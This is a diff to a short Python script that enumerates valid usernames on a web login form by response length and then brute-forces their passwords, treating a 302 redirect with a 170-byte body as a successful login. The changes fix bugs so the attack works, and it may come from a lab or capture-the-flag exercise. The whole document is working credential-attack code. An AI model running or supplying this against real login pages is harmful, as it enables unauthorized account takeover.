@@ -13,7 +13,7 @@ def check_username(username):
         "passweord": "password"
     }
     response = requests.post(URL,headers=HEADERS,data=data)
-    if len(response) >= 2986:
+    if len(response.text) > 2986:
         print (f"[v] USERNAME VALID")
         return True
     else:
@@ -25,7 +25,7 @@ def try_password(username,password):
         "username": username,
         "password": password
     }
-    response = requests.post(URL,headers=HEADERS,data=data)
+    response = requests.post(URL,headers=HEADERS,data=data, allow_redirects=False)
     if response.status_code == 302 and len(response.text) == 170:
         print(f"[v] LOGIN BERHASIL")
         return True
@@ -37,7 +37,7 @@ valid_data = []
 with open(USERNAME, 'r')  as file:
   for user in file:
     user = user.strip()
-    if check_user(user):
+    if check_username(user):
         valid_data.append(user)
 
 for valid_user in valid_data:
